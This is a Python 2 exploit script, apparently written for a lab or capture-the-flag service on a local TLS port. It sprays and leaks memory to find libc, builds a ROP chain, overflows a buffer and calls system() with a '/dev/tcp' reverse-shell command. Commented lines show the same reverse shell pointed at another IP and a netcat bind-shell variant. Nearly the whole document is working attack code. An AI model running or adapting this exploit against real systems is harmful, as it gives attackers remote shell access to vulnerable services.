#!/usr/bin/python
import socket
import struct
import ssl
import time
import telnetlib
import threading
import re
import sys
from struct import pack
from collections import Counter


v = ('127.0.0.1', 20006)

#  "/bin/sh > /dev/tcp/192.168.56.101/1337 0>&1 2>&1; "
#  "/bin/", "sh >", " /dev"

# connection 
def connect(v):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(v)
	time.sleep(0.1)
	s = ssl.wrap_socket(s,ssl_version=ssl.PROTOCOL_TLSv1)
	#time.sleep(0.1)
	print s.recv(1024)
	return s



def writethroughpayload(libc, base, data):
	data = re.findall('....', data)
	gt =  libc + 0x000e0097 # pop %ecx | pop %ebx | ret
	gt2 = libc + 0x000238df # pop %eax | ret
	gt3 = libc + 0x0006cc5a # mov %eax,(%ecx) | ret
	p = ''
	for n, i in enumerate(data):
		print '[+] Number {} Data {}'.format(n*4, i)
		p += pack("<I", gt) # pop %ecx | pop %ebx | ret
	        p += pack("<I", base+(n*4)) # @ .data + 4
		p += pack("<I", 0x42424242) # padding
		p += pack("<I", gt2) # pop %eax | ret
		p += i
		p += pack("<I", gt3) # mov %eax,(%ecx) | ret

	return p

#writethroughpayload(0, 0, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIjj")
#exit(0)

# Open bind shell : port 1337
def openncshell(libcbase):
	data = 0x179111
	# Because Of Some Error. Here, I am print every single payload bytes
	p = writethroughpayload(libcbase, libcbase+data,'/bin/sh > /dev/tcp/127.0.0.1/1337 0>&1 2>&1;  ') 
	#"/bin/nc.traditional -ltp1337 -e//bin//sh")
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += pack("<I", libcbase+data)
	p += pack("<I", libcbase + 0x0003cb20)*2 # system()
	#p += 'EEEE' # pack("<I", libcbase + 0x000329e0) # exit()
	p += pack("<I", libcbase + data) # @ .data
	return p


def exploit(libc):
	# Payload
	# EIP = 60
	# EDI = 52
	# ESI = 48
	# EBP = 56
	# EBX  = 44
	payload = 'N'*28  # Paddings
	payload += pack("I", 0xffffffb0)
	payload += 'Z'*12
	payload += 'JJJJ' # EBX
	payload += 'KKKK' # ESI
	payload += 'LLLL' # EDI
	payload += 'MMMM' # EBP
	payload += openncshell(libc) # EIP
	# Got Control Over 
	# EAX = EAX - 
	# EDX = 64 Offset 
	# ESI = 64 Offset
	#  mov    eax,DWORD PTR [esi+0x55c]
	addr = libc # libc base address
	addr += 0x10 # why 0x10 ? hmm, little brute force  testing
	bof = payload
	bof += struct.pack('I', addr + 12) # Just Paddings
	bof += struct.pack('I', addr + 8)
	bof += struct.pack('I', addr + 4)
	#bof += 'B'*100
	return bof

# heavy spray
def heavyspray(v):
	v = connect(v)
	for i in range(600):
		v.send("s {} {}\n".format(i, 500))
		v.send("{}\n".format('A'*500))

		time.sleep(0.005)
		v.recv(1024)
	v.close()
	return


# 
def extractaddr(data):
	data = data[::-1]
	b7 = re.findall('\xb7...', data)
	b8 = re.findall('\xb8...', data)

	if len(b8)<len(b7):
		b = [struct.unpack(">I", i)[0] for i in b7]
	else:
		b = [struct.unpack(">I", i)[0] for i in b8]
	b = [int(((i >> 12)<< 12)) for i in b]
	b.sort()
	print 'Complete : ', b
	for i in b:
		print hex(i)
	data = Counter(b)
	print "[-] Most Occured Address : ", data.most_common(1)[0][0]
	libc = int(data.most_common(1)[0][0]-0x179000)
	print "[-] May be Our Libc Address is : ", hex(libc)
	return libc



# MainEngine For Updating Data Regularly
class MainEngine(threading.Thread):
	def __init__(self, v):
		threading.Thread.__init__(self)
		self.s = connect(v)
		self.runcycle = True

	def run(self):
		print "[*] Main Engine Started."
	        buf1 = "B"*150
        	buf2 = "A"*150
        	size = len(buf1)
        	key = "test"
		while self.runcycle:
		                self.s.send("s {} {}\n".format(key, size))
                		self.s.send("{}\n".format(buf1))
		self.s.send('exit\n')
		self.s.close()	
		print "[*] Main Engine Close."
		return

# Back Engine For Reading Data Regularly
class BackEngine(threading.Thread):
	def __init__(self, v, engine):
		threading.Thread.__init__(self)
		self.engine = engine
		self.info = v
		self.v = connect(v)
		
	def run(self):
		print "[*] Back Engine Start"
		while True:
			self.v.send('g test\n')
			try:
                		chk = self.v.recv(1024)
			except:
				chk = ''                	
                	if chk:
                        	if ('\xb6' in chk) or ('\xb7' in chk) or ('\xb8' in chk) or ('\xb9' in chk):
                                	print [chk]
					self.engine.runcycle = False
					self.v.close()
					print "[*] Back Engine Close"
					libc = extractaddr(chk)
					bof = exploit(libc)
					raw_input('[-] Ready To Sent Exploit. Press Enter')
					v = connect(self.info)
					v.send("s exploit -1")
					v.send(bof+'Z'*8)
					raw_input("[+] Payload Sent. Check Netcat.")
					self.v.close()
					return
		return


def main(v):
	#raw_input('Heavy Spray Start')
	#heavyspray(v)
	raw_input('Data Leak Start')
	thread = MainEngine(v)
	#time.sleep(1)
	thread1 = BackEngine(v, thread)
	time.sleep(0.1)
	thread.start()
	time.sleep(0.1)
	thread1.start()
	print '[+] Waiting For Response.'
	thread1.join()
	print '[-] Extracting Data From Response.'
	#openncshell(libcbase)
	return

if 'leak' in sys.argv:
	main(v)

elif 'spray' in sys.argv:
	raw_input('Heavy Spray Start')
        heavyspray(v)
	print "[*] Spray Complete."
else:
	print "[*] Please Provide Usages Arguments : \n [1]. spray\n [2]. leak\n"

exit(0)


# Payload
# EIP = 60
# EDI = 52
# ESI = 48
# EBP = 56
# EBX  = 44
payload = 'A'*44  # Paddings
payload += 'BBBB' # EBX
payload += 'CCCC' # ESI
payload += 'DDDD' # EDI
payload += 'EEEE' # EBP
payload += 'FFFF' # EIP
# Got Control Over 
# EAX = EAX - 
# EDX = 64 Offset 
# ESI = 64 Offset
#  mov    eax,DWORD PTR [esi+0x55c]
addr = 0xb74bf000 # libc base address
addr += 0x10 # why 0x10 ? hmm, little brute force  testing
bof = payload
bof += struct.pack('I', addr + 12) # Just Paddings
bof += struct.pack('I', addr + 8) 
bof += struct.pack('I', addr + 4) 
bof = 'A'*64+ struct.pack('I', 0xb73e619c)
